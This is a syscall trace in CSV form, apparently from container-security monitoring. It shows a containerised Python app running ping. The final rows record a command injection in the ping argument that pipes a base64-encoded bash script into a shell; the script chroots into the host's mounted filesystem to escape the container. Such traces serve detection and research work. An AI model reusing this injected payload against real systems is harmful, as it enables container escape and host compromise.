evt_time,syscall_type,container_mounts,proc_args,proc_nthreads,proc_nchilds,proc_fdopencount,proc_vmsize,evt_args
11:59:24.188573819,poll,/:/host:rw:true:rslave,app.py,2,1,6,149744,res=0 fds=
11:59:24.188630746,poll,/:/host:rw:true:rslave,app.py,2,1,6,149744,fds=3:41 timeout=500
11:59:24.326477106,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=-11(EAGAIN) size=192 data=NULL tuple=NULL
11:59:24.326490872,sendmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>0.0.0.0:1) size=64 tuple=0.0.0.0:1->127.0.0.1:0
11:59:24.326549192,sendmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=64 data=..........hc....Y....................... !#$%&'()*+
11:59:24.326552057,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1)
11:59:24.326557317,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=84 size=84 data=E..T@...@.<...................hc....Y....................... !#$%&'()*+
11:59:24.326573217,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=1(<p>pipe:[26282]) size=57
11:59:24.326628534,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=57 data=64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.052 ms.
11:59:24.326634565,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1)
11:59:24.326819852,read,/:/host:rw:true:rslave,app.py,2,0,6,149744,res=57 data=64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.052 ms.
11:59:24.326830452,read,/:/host:rw:true:rslave,app.py,2,0,6,149744,fd=5(<p>pipe:[26282]) size=8029
11:59:24.689228872,poll,/:/host:rw:true:rslave,app.py,2,1,6,149744,res=0 fds=
11:59:24.689282777,poll,/:/host:rw:true:rslave,app.py,2,1,6,149744,fds=3:41 timeout=500
11:59:25.190152061,poll,/:/host:rw:true:rslave,app.py,2,1,6,149744,res=0 fds=
11:59:25.190211162,poll,/:/host:rw:true:rslave,app.py,2,1,6,149744,fds=3:41 timeout=500
11:59:25.325633862,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=-11(EAGAIN) size=192 data=NULL tuple=NULL
11:59:25.325648310,sendmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1) size=64 tuple=0.0.0.0:1->127.0.0.1:0
11:59:25.325723752,sendmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=64 data=..........hc............................ !#$%&'()*+
11:59:25.325727589,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1)
11:59:25.325734673,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=84 size=84 data=E..T@...@.;...................hc............................ !#$%&'()*+
11:59:25.325753208,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=1(<p>pipe:[26282]) size=57
11:59:25.325810893,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=57 data=64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.066 ms.
11:59:25.325819998,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1)
11:59:25.325868588,read,/:/host:rw:true:rslave,app.py,2,0,6,149744,res=57 data=64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.066 ms.
11:59:25.325876533,read,/:/host:rw:true:rslave,app.py,2,0,6,149744,fd=5(<p>pipe:[26282]) size=7972
11:59:25.692914217,poll,/:/host:rw:true:rslave,app.py,2,1,6,149744,res=0 fds=
11:59:25.695772890,poll,/:/host:rw:true:rslave,app.py,2,1,6,149744,fds=3:41 timeout=500
11:59:26.196469380,poll,/:/host:rw:true:rslave,app.py,2,1,6,149744,res=0 fds=
11:59:26.196537418,poll,/:/host:rw:true:rslave,app.py,2,1,6,149744,fds=3:41 timeout=500
11:59:26.325671025,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=-11(EAGAIN) size=192 data=NULL tuple=NULL
11:59:26.325688327,sendmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1) size=64 tuple=0.0.0.0:1->127.0.0.1:0
11:59:26.325750244,sendmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=64 data=..........hc....6....................... !#$%&'()*+
11:59:26.325759531,setitimer,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,
11:59:26.325763689,setitimer,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,
11:59:26.325765312,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=3(<4r>127.0.0.1->127.0.0.1)
11:59:26.325771454,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=84 size=84 data=E..TA!..@.;...................hc....6....................... !#$%&'()*+
11:59:26.325788456,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=1(<p>pipe:[26282]) size=57
11:59:26.325835921,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=57 data=64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.055 ms.
11:59:26.325841401,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=1(<p>pipe:[26282]) size=1
11:59:26.325844197,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=1 data=.
11:59:26.325859465,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=1(<p>pipe:[26282]) size=147
11:59:26.325861369,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=147 data=--- 127.0.0.1 ping statistics ---.4 packets transmitted
11:59:26.325864174,exit_group,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,
11:59:26.325931974,read,/:/host:rw:true:rslave,app.py,2,0,6,149744,res=205 data=64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.055 ms..--- 127.0.0.1 ping sta
11:59:26.325942594,read,/:/host:rw:true:rslave,app.py,2,0,6,149744,fd=5(<p>pipe:[26282]) size=7767
11:59:26.328466032,wait4,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,3,4504,
11:59:26.328502411,pipe,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,3,4504,
11:59:26.328510797,pipe,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,5,4504,res=0 fd1=3(<p>) fd2=4(<p>) ino=25296
11:59:26.328512430,clone,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,5,4504,
